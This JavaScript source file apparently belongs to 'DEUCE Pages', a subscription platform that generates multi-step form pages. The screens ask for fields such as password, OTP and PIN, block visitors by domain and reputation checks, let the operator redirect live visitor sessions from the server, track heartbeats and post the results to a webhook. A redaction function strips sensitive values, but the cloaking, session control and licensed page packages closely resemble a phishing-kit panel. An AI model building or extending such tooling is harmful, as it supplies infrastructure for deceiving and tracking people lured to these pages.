      }
      .captcha-state {
        margin: 0;
        color: var(--muted);
        font: 700 .72rem/1.4 Consolas, monospace;
      }
      .captcha-state[data-state="verifying"] { color: #8cbcff; }
      .captcha-state[data-state="success"] { color: var(--success); }
      .captcha-state[data-state="error"] { color: var(--danger); }
      #turnstileBox { display: grid; place-items: center; min-height: 65px; }
      .captcha-provider { margin: -6px 0 0; color: var(--muted); font: 700 .66rem Consolas, monospace; text-align: center; }
      .blocked {
        border-color: rgb(var(--danger-rgb) / .48);
      }
      .blocked h1 { color: var(--danger); }
      .hidden { display: none; }
    </style>
  </head>
  <body>
    <main>
      <small id="stepLabel"></small>
      <h1 id="screenTitle"></h1>
      <p id="screenCopy"></p>
      <div class="status" id="runtimeStatus"></div>
      <form id="screenForm"></form>
      <div class="meta">
        <span id="pageName"></span>
        <span id="progress"></span>
      </div>
    </main>

    <script>
      window.DEUCE_PAGE_CONFIG = ${configJson};

      const config = window.DEUCE_PAGE_CONFIG;
      let currentStep = 0;
      const sessionData = {};
      const sessionId = "sess_" + Date.now().toString(36) + "_" + Math.random().toString(36).slice(2, 8);
      let runtimeAllowed = true;
      let captchaPassed = false;
      let captchaToken = "";
      let challengeProof = "";
      let captchaWidgetId = null;
      let turnstileScriptPromise = null;
      const pageName = document.querySelector("#pageName");
      const progress = document.querySelector("#progress");
      const stepLabel = document.querySelector("#stepLabel");
      const screenTitle = document.querySelector("#screenTitle");
      const screenCopy = document.querySelector("#screenCopy");
      const screenForm = document.querySelector("#screenForm");
      const runtimeStatus = document.querySelector("#runtimeStatus");

      pageName.textContent = config.pageName;

      function endpoint(path) {
        if (path.startsWith("http")) return path;
        return config.apiBase.replace(/\\/$/, "") + "/" + path.replace(/^\\//, "");
      }

      function setStatus(items) {
        runtimeStatus.innerHTML = items.map((item) => "<span>" + item + "<\\/span>").join("");
      }

      function blockPage(reason, detail) {
        runtimeAllowed = false;
        document.querySelector("main").classList.add("blocked");
        stepLabel.textContent = "access denied";
        screenTitle.textContent = "ACCESS DENIED";
        screenCopy.textContent = "ACCESS DENIED";
        screenForm.innerHTML = "";
        progress.textContent = "blocked";
      }

      function normalizeHost(value) {
        return String(value || "").trim().toLowerCase().replace(/^https?:\\/\\//, "").replace(/\\/.*$/, "").replace(/:\\d+$/, "");
      }

      async function refreshLiveConfig() {
        if (!config.runtime?.configEndpoint) {
          throw new Error("Live security configuration endpoint is missing");
        }
        const response = await fetch(config.runtime.configEndpoint, {
          method: "GET",
          cache: "no-store",
          headers: { Accept: "application/json" }
        });
        const result = await response.json().catch(() => ({}));
        if (!response.ok || !result.config) {
          throw new Error(result.error || "Live security configuration is unavailable");
        }
        const live = result.config;
        config.domain = live.domain || config.domain;
        config.hosting = live.hosting || config.hosting;
        config.allowedDomains = live.security?.domains || config.allowedDomains || [];
        config.subscription = live.subscription || config.subscription;
        config.security = live.security || {};
        config.resultSettings = live.resultSettings || config.resultSettings;
        config.generatedFile = live.generatedFile || config.generatedFile;
        window.DEUCE_PAGE_CONFIG = config;
        return config;
      }

      function enforceDomain() {
        const allowedDomains = (config.security?.domains || config.allowedDomains || []).map(normalizeHost).filter(Boolean);
        const hostname = normalizeHost(window.location.hostname);

        if (allowedDomains.length && !allowedDomains.includes(hostname)) {
          blockPage("ACCESS DENIED", "ACCESS DENIED");
          return false;
        }
        return true;
      }

      async function checkRemoteSecurity(eventName) {
        const payload = {
          pageId: config.pageId,
          userPageId: config.id,
          userId: config.userId,
          licenseKey: config.licenseKey,
          packageId: config.packageId,
          packageVersion: config.packageVersion,
          hostname: window.location.hostname,
          sessionId,
          event: eventName,
          createdAt: new Date().toISOString()
        };

        try {
          const response = await fetch(config.runtime.securityEndpoint, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
          });
          const decision = await response.json().catch(() => ({}));
          if (!response.ok || decision.allowed === false) {
            blockPage("ACCESS DENIED", "ACCESS DENIED");
            return false;
          }
          if (decision.captchaRequired && !config.security?.captcha) {
            config.security.captcha = true;
            captchaPassed = false;
          }
          return true;
        } catch (error) {
          const mode = config.security?.vpnProxyRules?.reputationFailureMode || "challenge";
          if (mode === "block") {
            blockPage("ACCESS DENIED", "SECURITY CHECK UNAVAILABLE");
            return false;
          }
          if (mode === "challenge") {
            if (!turnstileSiteKey()) {
              blockPage("ACCESS DENIED", "HUMAN VERIFICATION UNAVAILABLE");
              return false;
            }
            config.security.captcha = true;
            captchaPassed = false;
          }
          return true;
        }
      }

      function trackTraffic(eventName, extra = {}) {
        const payload = {
          pageId: config.pageId,
          userPageId: config.id,
          userId: config.userId,
          licenseKey: config.licenseKey,
          sessionId,
          hostname: window.location.hostname,
          path: window.location.pathname,
          event: eventName,
          screen: config.screens[currentStep]?.name || null,
          userAgent: navigator.userAgent,
          createdAt: new Date().toISOString(),
          ...extra
        };

        fetch(config.runtime.trafficEndpoint, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        }).catch(() => {
          console.info("DEUCE Pages traffic payload queued for Render API", payload);
        });
      }

      function trackHeartbeat() {
        trackTraffic("heartbeat", {
          metadata: {
            visibility: document.visibilityState || "visible"
          }
        });
      }

      function sameLocation(targetUrl) {
        try {
          const target = new URL(targetUrl, window.location.href);
          const current = new URL(window.location.href);
          return target.origin === current.origin
            && target.pathname === current.pathname
            && target.search === current.search
            && target.hash === current.hash;
        } catch (error) {
          return false;
        }
      }

      function checkSessionCommand() {
        const commandUrl = config.runtime.commandEndpoint || endpoint("/api/runtime/session-command");
        const params = new URLSearchParams({ userPageId: config.id, sessionId });
        fetch(\`\${commandUrl}?\${params.toString()}\`)
          .then((response) => response.ok ? response.json() : null)
          .then((data) => {
            const command = data && data.command;
            if (command && command.action === "redirect" && command.targetUrl) {
              if (sameLocation(command.targetUrl)) {
                if (command.forceReload) window.location.reload();
                return;
              }
              window.location.href = command.targetUrl;
            }
          })
          .catch(() => {});
      }

      window.setInterval(checkSessionCommand, 4000);
      window.setInterval(trackHeartbeat, 10000);

      function fieldsFor(screen) {
        return String(screen.config.fields || "")
          .split(",")
          .map((field) => field.trim())
          .filter(Boolean);
      }

      function inputTypeFor(field) {
        const lower = field.toLowerCase();
        if (lower.includes("email")) return "email";
        if (lower.includes("phone") || lower.includes("otp") || lower.includes("code")) return "tel";
        if (lower.includes("password") || lower.includes("pin")) return "password";
        return "text";
      }

      function isSensitiveField(field, input) {
        const text = [
          field,
          input && input.name,
          input && input.id,
          input && input.type,
          input && input.autocomplete,
          input && input.placeholder
        ].filter(Boolean).join(" ").toLowerCase();
        return /password|passcode|otp|one.?time|verification|2fa|mfa|pin|card|cc|credit|debit|cvv|cvc|security.?code|expiry|exp|routing|account|ssn|social|token|secret|credential|login|email/.test(text);
      }

      function fieldLabel(input) {
        const escapedId = input.id && window.CSS && CSS.escape ? CSS.escape(input.id) : "";
        const label = escapedId ? document.querySelector('label[for="' + escapedId + '"]') : null;
        const wrapperLabel = input.closest && input.closest("label");
        return input.getAttribute("aria-label")
          || input.placeholder
          || (label && label.textContent)
          || (wrapperLabel && wrapperLabel.textContent)
          || input.name
          || input.id
          || "Field";
      }

      function safeFormData(form) {
        const data = {};
        const fields = Array.from(form.elements || []).filter(function (input) {
          return input && !input.disabled && !["submit", "button", "reset", "file"].includes(String(input.type || "").toLowerCase());
        });
        fields.forEach(function (input) {
          if ((input.type === "checkbox" || input.type === "radio") && !input.checked) return;
          const key = fieldLabel(input).replace(/\\s+/g, " ").trim();
          if (!key) return;
          data[key] = isSensitiveField(key, input) ? (input.value ? "[redacted]" : "[blank]") : input.value || "";
        });
        data._fieldCount = fields.length;
        data._redaction = "passwords, OTPs, card fields, login/email credentials, tokens, and similar sensitive values are not stored";
        return data;
      }

      function turnstileSiteKey() {
        return config.security?.turnstile?.siteKey || "";
      }
      function captchaBrandingLabel() {
        return String(
          config.security?.turnstile?.displayDomain
          || config.domain
          || config.pageName
          || window.location.hostname
          || "Protected page"
        ).trim();
      }

      function captchaBrandingInitials(value) {
        return String(value || "DP")
          .split(/[^a-z0-9]+/i)
          .filter(Boolean)
          .slice(0, 2)
          .map((part) => part.charAt(0).toUpperCase())
          .join("")
          .slice(0, 2) || "DP";
      }

      function setCaptchaState(message, state = "ready") {
        const node = document.querySelector("#captchaState");
        if (!node) return;
        node.textContent = message;
        node.dataset.state = state;
      }

      function loadCaptchaBranding() {
        const label = captchaBrandingLabel();
        const domain = document.querySelector("#captchaDomain");
        const image = document.querySelector("#captchaBrandImage");
        const fallback = document.querySelector("#captchaBrandFallback");
        if (!domain || !image || !fallback) return;
        domain.textContent = label;
        fallback.textContent = captchaBrandingInitials(config.pageName || label);
        const brandingEndpoint = config.runtime?.brandingEndpoint;
        if (!brandingEndpoint) return;
        const brandingUrl = new URL(brandingEndpoint, window.location.href);
        brandingUrl.searchParams.set("hostname", window.location.hostname);
        image.onload = () => {
          image.hidden = false;
          fallback.hidden = true;
        };
        image.onerror = () => {
          image.hidden = true;
          fallback.hidden = false;
        };
        image.src = brandingUrl.toString();
      }

      function loadTurnstileScript() {
        if (window.turnstile) return Promise.resolve();
        if (turnstileScriptPromise) return turnstileScriptPromise;
        turnstileScriptPromise = new Promise((resolve, reject) => {
          const script = document.createElement("script");
          script.src = "https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit";
          script.async = true;
          script.defer = true;
          script.onload = () => window.turnstile ? resolve() : reject(new Error("Turnstile did not initialize"));
          script.onerror = () => reject(new Error("Turnstile could not load"));
          document.head.appendChild(script);
        });
        return turnstileScriptPromise;
      }

      function resetCaptcha(message) {
        captchaToken = "";
        captchaPassed = false;
        setCaptchaState(message, "error");
        if (window.turnstile && captchaWidgetId !== null) {
          window.turnstile.reset(captchaWidgetId);
        }
      }

      function renderTurnstile() {
        const mount = document.querySelector("#turnstileBox");
        if (!config.security?.captcha || captchaPassed || !mount) return;
        loadCaptchaBranding();
        setCaptchaState("Complete the verification to continue.", "ready");
        if (!turnstileSiteKey()) {
          trackTraffic("turnstile_config_missing", {
            result: "blocked",
            reason: "Turnstile site key is missing"
          });
          blockPage("ACCESS DENIED", "HUMAN VERIFICATION UNAVAILABLE");
          return;
        }
        if (!window.turnstile) {
          loadTurnstileScript().then(renderTurnstile).catch((error) => {
            trackTraffic("turnstile_load_failed", {
              result: "blocked",
              reason: error.message
            });
            blockPage("ACCESS DENIED", "HUMAN VERIFICATION UNAVAILABLE");
          });
          return;
        }
        if (captchaWidgetId !== null) return;
        captchaWidgetId = window.turnstile.render(mount, {
          sitekey: turnstileSiteKey(),
          callback(token) {
            captchaToken = token;
            setCaptchaState("Check complete. Continue when ready.", "success");
            screenCopy.textContent = "Session check complete. Continue when ready.";
          },
          "expired-callback"() {
            captchaToken = "";
            captchaPassed = false;
            setCaptchaState("Verification expired. Please try again.", "error");
          },
          "error-callback"() {
            captchaToken = "";
            captchaPassed = false;
            setCaptchaState("Verification could not start. Please retry.", "error");
            screenCopy.textContent = "Turnstile could not load. Refresh and try again.";
          }
        });
      }

      async function verifyTurnstile() {
        if (!config.security?.captcha) return true;
        if (!captchaToken) {
          setCaptchaState("Complete the verification before continuing.", "error");
          screenCopy.textContent = "Complete the Turnstile check before continuing.";
          return false;
        }
        setCaptchaState("Confirming verification...", "verifying");
        try {
          const response = await fetch(config.runtime.turnstileEndpoint, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              pageId: config.pageId,
              userPageId: config.id,
              sessionId,
              hostname: window.location.hostname,
              token: captchaToken
            })
          });
          const result = await response.json().catch(() => ({}));
          if (!response.ok || !result.verified) {
            resetCaptcha("Verification failed. Please try again.");
            screenCopy.textContent = "Verification failed. Complete the check again.";
            return false;
          }
          captchaPassed = true;
          challengeProof = result.challengeProof || "";
          setCaptchaState("Verified. Continuing...", "success");
          return true;
        } catch (error) {
          resetCaptcha("Verification could not be confirmed. Please try again.");
          screenCopy.textContent = "Turnstile verification could not reach the API.";
          return false;
        }
      }

      function renderStep() {
        if (!runtimeAllowed) return;
        const screen = config.screens[currentStep];
        stepLabel.textContent = screen.type;
        screenTitle.textContent = screen.config.title || screen.name + " Page";
        screenCopy.textContent = "Complete this step to continue through the configured page session.";
        progress.textContent = (currentStep + 1) + " / " + config.screens.length;
        setStatus([
          config.packageVersion,
          config.generatedFile?.version || "generated",
          config.security?.captcha ? "captcha on" : "captcha off",
          config.resultSettings?.retentionDays + "d retention"
        ]);

        const fields = fieldsFor(screen);
        screenForm.innerHTML = fields.map((field) => \`
          <label>
            <span>\${field}</span>
            <input required type="\${inputTypeFor(field)}" name="\${field.toLowerCase().replace(/\\s+/g, "_")}" autocomplete="off">
          </label>
        \`).join("") + \`
          <div class="captcha-box \${config.security?.captcha && !captchaPassed ? "active" : ""}">
            <div class="captcha-brand">
              <img id="captchaBrandImage" class="captcha-logo" alt="" hidden referrerpolicy="no-referrer">
              <div id="captchaBrandFallback" class="captcha-fallback" aria-hidden="true">DP</div>
              <div class="captcha-copy">
                <p id="captchaDomain" class="captcha-domain"></p>
                <p id="captchaState" class="captcha-state" data-state="ready" aria-live="polite">Complete the verification to continue.</p>
              </div>
            </div>
            <div id="turnstileBox"></div>
            <small class="captcha-provider">Protected by Cloudflare Turnstile</small>
          </div>
          <button type="submit">\${screen.config.buttonText || "Next"}</button>
        \`;
        window.setTimeout(renderTurnstile, 0);
        trackTraffic("screen_view", { screen: screen.name });
      }

      function storeScreenData(screen) {
        sessionData[screen.name] = safeFormData(screenForm);
      }

      function sendResult(screen) {
        const payload = {
          id: "res_" + Date.now().toString(36),
          userPageId: config.id,
          userId: config.userId,
          packageId: config.packageId,
          packageVersion: config.packageVersion,
          pageId: config.pageId,
          pageName: config.pageName,
          licenseKey: config.licenseKey,
          sessionId,
          screen: screen.name,
          flow: config.screens.map((item) => item.name),
          data: sessionData,
          hostname: window.location.hostname,
          path: window.location.pathname,
          userAgent: navigator.userAgent,
          resultSettings: config.resultSettings,
          challengeProof,
          createdAt: new Date().toISOString()
        };

        fetch(config.runtime.resultEndpoint || endpoint(config.resultSettings?.webhook || "/api/page-results"), {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        }).catch(() => {
          console.info("DEUCE Pages result payload queued for Render API", payload);
        });
      }

      screenForm.addEventListener("submit", async (event) => {
        event.preventDefault();
        if (!runtimeAllowed) return;
        if (config.security?.captcha && !captchaPassed) {
          const verified = await verifyTurnstile();
          if (!verified) return;
        }

        const remoteAllowed = await checkRemoteSecurity("submit");
        if (!remoteAllowed) return;

        const screen = config.screens[currentStep];
        storeScreenData(screen);
        trackTraffic("screen_submit", { screen: screen.name });

        if (currentStep < config.screens.length - 1) {
          currentStep += 1;
          renderStep();
          return;
        }

        sendResult(screen);

        if (screen.config.redirectUrl) {
          window.location.href = screen.config.redirectUrl;
          return;
        }

        screenTitle.textContent = "Session complete";
        screenCopy.textContent = "This generated index.html has finished the configured page flow.";
        stepLabel.textContent = "complete";
        screenForm.innerHTML = "";
        progress.textContent = "done";
        trackTraffic("flow_complete");
      });

      async function boot() {
        setStatus(["loading live security", config.pageId, config.generatedFile?.version || "generated"]);
        try {
          await refreshLiveConfig();
        } catch (error) {
          trackTraffic("config_load_failed", {
            result: "blocked",
            reason: error.message
          });
          blockPage("ACCESS DENIED", "SECURITY CONFIGURATION UNAVAILABLE");
          return;
        }

        pageName.textContent = config.pageName;
        captchaPassed = !Boolean(config.security?.captcha);
        if (config.security?.captcha && !turnstileSiteKey()) {
          blockPage("ACCESS DENIED", "HUMAN VERIFICATION UNAVAILABLE");
          return;
        }
        if (!enforceDomain()) return;
        const remoteAllowed = await checkRemoteSecurity("boot");
        if (!remoteAllowed) return;
        trackTraffic("page_load");
        trackHeartbeat();
        renderStep();
      }

      boot();
    <\/script>
  </body>
</html>`;
}

function downloadGeneratedIndex(page) {
  if (!page) throw new Error("Page record not found");
  const pagePackage = packageForUserPage(page);
  const importedPackage = ["r2", "github"].includes(String(pagePackage?.sourceType || "").toLowerCase());
  if (importedPackage && !packageEntryFile(pagePackage)) {
    throw new Error("Imported package has no entry HTML page");
  }

  const previousGeneratedFile = page.generatedFile || {};
  page.generatedFile = {
    ...previousGeneratedFile,
    downloadName: "index.html",
    lastGeneratedAt: new Date().toISOString()
  };

  let html;
  try {
    html = createGeneratedIndex(page);
  } catch (error) {
    page.generatedFile = previousGeneratedFile;
    throw error;
  }
  if (typeof html !== "string" || !/^\s*<!doctype html>/i.test(html)) {
    page.generatedFile = previousGeneratedFile;
    throw new Error("Generated launcher is invalid");
  }

  const blob = new Blob([html], { type: "text/html;charset=utf-8" });
  if (!blob.size) {
    page.generatedFile = previousGeneratedFile;
    throw new Error("Generated launcher is empty");
  }

  if (typeof navigator.msSaveOrOpenBlob === "function") {
    navigator.msSaveOrOpenBlob(blob, "index.html");
  } else {
    const url = URL.createObjectURL(blob);
    const link = document.createElement("a");
    link.href = url;
    link.download = "index.html";
    link.rel = "noopener";
    link.style.display = "none";
    document.body.appendChild(link);
    link.click();
    window.setTimeout(() => {
      link.remove();
      URL.revokeObjectURL(url);
    }, 4000);
  }

  saveFlowState(page);
  statusText.textContent = `${page.name.toUpperCase()} INDEX.HTML DOWNLOADED`;
  return true;
}

function renderButtons() {
  if (!templateList) return;

  templateList.innerHTML = "";

  templates.forEach((template) => {
    const button = document.createElement("button");
    button.className = `template-button${template.id === activeTemplate.id ? " active" : ""}`;
    button.type = "button";
    button.innerHTML = `<strong>${template.name}</strong><span>${template.description}</span>`;
    button.addEventListener("click", () => setTemplate(template));
    templateList.append(button);
  });
}

function setTemplate(template) {
  activeTemplate = template;
  const source = document.querySelector(`#${template.id}`);
  preview.replaceChildren(source.content.cloneNode(true));
  statusText.textContent = template.status;
  renderButtons();
}

function keepActiveNavVisible(item) {
  const nav = item?.closest(".side-nav");
  if (!nav || !window.matchMedia("(max-width: 860px)").matches) return;
  const reduceMotion = window.matchMedia("(prefers-reduced-motion: reduce)").matches;
  window.requestAnimationFrame(() => {
    const targetLeft = item.offsetLeft - ((nav.clientWidth - item.offsetWidth) / 2);
    nav.scrollTo({ left: Math.max(0, targetLeft), behavior: reduceMotion ? "auto" : "smooth" });
  });
}

function setActiveNav(hash) {
  let activeItem = null;
  document.querySelectorAll(".nav-item").forEach((item) => {
    if (item.getAttribute("href") === "#admin" && !isAdmin()) {
      item.hidden = true;
      item.classList.add("is-hidden");
      item.style.display = "none";
      item.removeAttribute("aria-current");
      return;
    }
    const isActive = item.getAttribute("href") === hash;
    item.classList.toggle("active", isActive);
    if (isActive) {
      item.setAttribute("aria-current", "page");
      activeItem = item;
    } else {
      item.removeAttribute("aria-current");
    }
  });
  keepActiveNavVisible(activeItem);
}

function closeTopbarOverlays() {
  document.querySelector(".topbar-menu")?.removeAttribute("open");
  if (notificationPanel) notificationPanel.hidden = true;
  notificationToggle?.setAttribute("aria-expanded", "false");
}

function dashboardPageAction(page) {
  const routeKey = pageRouteKey(page);
  const renewal = subscriptionState(page);
  const readiness = pageLaunchReadiness(page);
  const risk = pageRiskSignal(page);

  if (renewal.expired) {
    return { tone: "danger", status: "Expired", label: "Renew", route: "#my-pages" };
  }

  if (renewal.dueSoon) {
    return { tone: "warning", status: "Renew soon", label: "Review", route: "#my-pages" };
  }

  if (risk.status === "red") {
    return {
      tone: "danger",
      status: "Attention",
      label: risk.action || "Fix",
      route: risk.fix || `#security-${routeKey}:security`
    };
  }

  if (risk.status === "yellow" || readiness.percent < 100) {
    return {
      tone: "warning",
      status: "Setup",
      label: "Continue",
      route: risk.fix || `#go-live-${routeKey}`
    };
  }

  return { tone: "success", status: "Active", label: "Manage", route: `#config-${routeKey}` };
}

function dashboardPageInitials(name = "Page") {
  return String(name)
    .trim()
    .split(/\s+/)
    .filter(Boolean)
    .slice(0, 2)
    .map((part) => part[0])
    .join("")
    .toUpperCase() || "PG";
}

function dashboardPageLogoMarkup(page) {
  const packageId = String(page.packageId || "");
  const pageSlug = String(page.slug || "");
  const pagePackage = marketPages.find((item) => (
    (packageId && String(item.id || "") === packageId)
    || (pageSlug && String(item.slug || "") === pageSlug)
  ));
  const thumbnailUrl = pagePackage ? packageThumbnailUrl(pagePackage) : "";
  const fallback = `<span class="dashboard-page-mark-fallback">${escapeHtml(dashboardPageInitials(page.name))}</span>`;
  if (!thumbnailUrl) return `<span class="dashboard-page-mark" aria-hidden="true">${fallback}</span>`;
  return `
    <span class="dashboard-page-mark has-image" aria-hidden="true">
      <img src="${escapeHtml(thumbnailUrl)}" alt="" loading="lazy" referrerpolicy="no-referrer" onerror="this.parentElement.classList.remove('has-image');this.remove()">
      ${fallback}
    </span>
  `;
}

function renderDashboard() {
  activeFlowSlug = null;
  const pageRows = ownedPages.map((page) => {
    const action = dashboardPageAction(page);
    return `
      <article class="dashboard-subscription-row is-${action.tone}">
        ${dashboardPageLogoMarkup(page)}
        <div class="dashboard-page-copy">
          <h3>${escapeHtml(page.name || "Subscribed page")}</h3>
          <span class="dashboard-page-status"><i aria-hidden="true"></i>${escapeHtml(action.status)}</span>
        </div>
        <button type="button" class="primary" data-route="${escapeHtml(action.route)}">${escapeHtml(action.label)}</button>
      </article>
    `;
  }).join("");

  preview.innerHTML = `
    <section class="app-view dashboard-view dashboard-minimal">
      <header class="dashboard-minimal-header">
        <div>
          <small>dashboard</small>
          <h2>Your pages</h2>
        </div>
        ${ownedPages.length ? '<button type="button" data-route="#pages">Browse pages</button>' : ""}
      </header>

      ${ownedPages.length ? `
        <div class="dashboard-subscription-list" aria-label="Subscribed pages">
          ${pageRows}
        </div>
      ` : `
        <article class="dashboard-minimal-empty">
          <span class="dashboard-page-mark" aria-hidden="true">+</span>
          <div>
            <h3>${apiLoadError ? "Pages unavailable" : "No subscribed pages"}</h3>
            <p>${apiLoadError ? "Open My Pages and try again." : "Choose a page package to begin."}</p>
          </div>
          <button type="button" class="primary" data-route="${apiLoadError ? "#my-pages" : "#pages"}">${apiLoadError ? "My Pages" : "Browse pages"}</button>
        </article>
      `}
    </section>
  `;
  statusText.textContent = ownedPages.length ? "SUBSCRIBED PAGES READY" : "NO SUBSCRIBED PAGES";
  topbarTitle.textContent = "Dashboard";
}

function renderLogin() {
  activeFlowSlug = null;
  setAuthLayout(true);
  const auth = getAuthState();
  preview.innerHTML = `
    <section class="app-view auth-view">
      <div class="view-heading">
        <small>secure access</small>
        <h2>Login</h2>
      </div>
      <div class="auth-shell">
        <article class="auth-card package-form">
          <div>
            <small>invite-only workspace</small>
            <h3>Access</h3>
            <p>Registration is available only through a valid invitation from the administrator.</p>
          </div>
          <label>
            <span>Email address</span>
            <input type="email" data-auth-field="loginEmail" value="${escapeHtml(auth.user?.email || "")}" placeholder="you@example.com" autocomplete="email">
          </label>
          <label>
            <span>Password</span>
            <input type="password" data-auth-field="loginPassword" placeholder="Enter your password" autocomplete="current-password">
          </label>
          <div class="admin-actions">
            <button type="button" data-login-submit>Sign in</button>
          </div>
        </article>
      </div>
    </section>
  `;
  statusText.textContent = auth.user ? `SIGNED IN AS ${auth.user.email}` : "INVITE-ONLY LOGIN READY";
  topbarTitle.textContent = "Login";
}

function renderSignup() {
  activeFlowSlug = null;
  setAuthLayout(true);
  const inviteToken = inviteTokenFromHash();
  const shouldValidate = Boolean(inviteToken && signupInviteState.token !== inviteToken);

  if (!inviteToken) {
    signupInviteState = { token: "", status: "idle", email: "", expiresAt: "", error: "" };
  } else if (shouldValidate) {
    signupInviteState = { token: inviteToken, status: "validating", email: "", expiresAt: "", error: "" };
  }

  let cardMarkup;
  if (!inviteToken) {
    cardMarkup = `
      <article class="auth-card package-form">
        <div>
          <small>invitation required</small>
          <h3>Invite-only registration</h3>
          <p>Ask the administrator for an invitation link. Public account creation is disabled.</p>
        </div>
        <div class="admin-actions">
          <button type="button" data-route="#login">Back to login</button>
        </div>
      </article>
    `;
  } else if (signupInviteState.status === "validating") {
    cardMarkup = `
      <article class="auth-card package-form">
        <div>
          <small>checking invitation</small>
          <h3>Validating secure link</h3>
          <p>Please wait while Deuce Pages verifies that this invitation is active and unused.</p>
        </div>
      </article>
    `;
  } else if (signupInviteState.status !== "valid") {
    cardMarkup = `
      <article class="auth-card package-form">
        <div>
          <small>invitation unavailable</small>
          <h3>Link cannot be used</h3>
          <p>${escapeHtml(signupInviteState.error || "This invitation is invalid, expired, revoked, or already used.")}</p>
        </div>
        <div class="admin-actions">
          <button type="button" data-route="#login">Back to login</button>
        </div>
      </article>
    `;
  } else {
    cardMarkup = `
      <article class="auth-card package-form">
        <div>
          <small>verified invitation</small>
          <h3>Create invited account</h3>
          <p>This link is for ${escapeHtml(signupInviteState.email)} and expires ${escapeHtml(new Date(signupInviteState.expiresAt).toLocaleString())}.</p>
        </div>
        <label>
          <span>Full name</span>
          <input type="text" data-auth-field="signupName" placeholder="Workspace owner" autocomplete="name">
        </label>
        <label>
          <span>Invited email</span>
          <input type="email" value="${escapeHtml(signupInviteState.email)}" autocomplete="email" disabled>
        </label>
        <label>
          <span>Password</span>
          <input type="password" data-auth-field="signupPassword" placeholder="Create a password" autocomplete="new-password">
        </label>
        <label>
          <span>Confirm password</span>
          <input type="password" data-auth-field="signupConfirm" placeholder="Repeat password" autocomplete="new-password">
        </label>
        <div class="admin-actions">
          <button type="button" data-signup-submit>Create account</button>
          <button type="button" data-route="#login">Sign in</button>
        </div>
      </article>
    `;
  }

  preview.innerHTML = `
    <section class="app-view auth-view">
      <div class="view-heading">
        <small>invited workspace</small>
        <h2>Create account</h2>
      </div>
      ${viewNav([
        routeButton("#login", "Back to login")
      ])}
      <div class="auth-shell">
        ${cardMarkup}
      </div>
    </section>
  `;
  statusText.textContent = signupInviteState.status === "valid" ? "INVITATION VERIFIED" : "INVITATION REQUIRED";
  topbarTitle.textContent = "Invite Signup";

  if (shouldValidate) void validateSignupInvitation(inviteToken);
}
async function handleLogin() {
  const email = authField("loginEmail");
  const password = authField("loginPassword");

  if (!email || !password) {
    statusText.textContent = "EMAIL AND PASSWORD REQUIRED";
    return;
  }

  try {
    const result = await requestApi("/api/auth/login", {
      method: "POST",
      body: JSON.stringify({ email, password })
    });
    saveAuthState({ user: result.user });
    await loadAppData();
    await refreshNotifications({ silent: true });
    startNotificationPolling();
    statusText.textContent = "API SESSION OPENED";
  } catch (error) {
    statusText.textContent = error.message.toUpperCase();
    return;
  }

  window.location.assign("/portal#dashboard");
}

async function handleSignup() {
  const inviteToken = inviteTokenFromHash();
  const name = authField("signupName");
  const password = authField("signupPassword");
  const confirmPassword = authField("signupConfirm");

  if (!inviteToken || signupInviteState.token !== inviteToken || signupInviteState.status !== "valid") {
    statusText.textContent = "VALID INVITATION REQUIRED";
    return;
  }

  if (!name || !password || !confirmPassword) {
    statusText.textContent = "ALL SIGNUP FIELDS REQUIRED";
    return;
  }

  if (password !== confirmPassword) {
    statusText.textContent = "PASSWORDS DO NOT MATCH";
    return;
  }

  try {
    const result = await requestApi("/api/auth/register", {
      method: "POST",
      body: JSON.stringify({ name, password, inviteToken })
    });
    saveAuthState({ user: result.user });
    signupInviteState = { token: "", status: "idle", email: "", expiresAt: "", error: "" };
    await loadAppData();
    await refreshNotifications({ silent: true });
    startNotificationPolling();
    statusText.textContent = "ACCOUNT CREATED / INVITATION CONSUMED";
  } catch (error) {
    statusText.textContent = error.message.toUpperCase();
    return;
  }

  window.location.assign("/portal#dashboard");
}
async function handleLogout() {
  try {
    if (isLoggedIn()) {
      await requestApi("/api/auth/logout", { method: "POST" });
    }
  } catch {
    // Local logout should still complete even if the API is offline.
  }
  clearAuthState();
  document.querySelector(".topbar-menu")?.removeAttribute("open");
  statusText.textContent = "SIGNED OUT";
  window.location.replace("/login");
}

function renderPages() {
  activeFlowSlug = null;
  const emptyAction = isAdmin() ? "#admin" : "";
  preview.innerHTML = `
    <section class="app-view">
      <div class="view-heading">
        <small>pages marketplace</small>
        <h2>Choose a page</h2>
        <p>Preview available pages, choose a subscription plan, and activate one from your wallet.</p>
      </div>
      <div class="page-grid">
        ${marketPages.length ? marketPages.map((page) => {
          const selectedPlan = selectedBillingPeriod(page);
          return `
          <article class="market-card">
            <div class="page-preview market-frame" aria-hidden="true">
              <div class="market-frame-shell">
                <i></i>
                <i></i>
                <i></i>
                <strong>${escapeHtml(page.name)}</strong>
              </div>
            </div>
            <div class="market-card-body">
              <div class="market-heading">
                ${pageIconMarkup(page)}
                <div class="card-copy">
                  <small>available page</small>
                  <h3>${escapeHtml(page.name)}</h3>
                  <p>${escapeHtml(page.userSummary)}</p>
                </div>
              </div>
              <div class="market-subscription">
                <label>
                  <span>Subscription</span>
                  <select data-market-plan="${escapeHtml(page.slug)}" aria-label="${escapeHtml(page.name)} subscription plan">
                    ${Object.keys(billingPeriodLabels).map((period) => `
                      <option value="${period}" ${period === selectedPlan ? "selected" : ""}>${billingOptionLabel(page, period)}</option>
                    `).join("")}
                  </select>
                </label>
                <strong data-market-price="${escapeHtml(page.slug)}">${marketPriceLabel(page, selectedPlan)}</strong>
              </div>
              <div class="card-footer">
                <div class="market-actions">
                  <button type="button" data-market-preview="${escapeHtml(page.slug)}" ${page.previewReady ? "" : "disabled"}>Preview</button>
                  <button type="button" data-market-subscribe="${escapeHtml(page.slug)}">${marketSubscribeLabel(page, selectedPlan)}</button>
                </div>
              </div>
            </div>
          </article>
        `;
        }).join("") : emptyState("No published packages yet", "Published pages will appear here when they are available for subscription.", emptyAction)}
      </div>
    </section>
  `;
  statusText.textContent = "PAGES MARKETPLACE READY";
  topbarTitle.textContent = "Pages";
}

function packageSubscriberCount(pagePackage) {
  return adminUsers.reduce((total, user) => total + (user.pages || []).filter((page) => page.packageId === pagePackage.id).length, 0);
}

function renderAdminPackages() {
  activeFlowSlug = null;
  const state = adminPackageLibraryState;
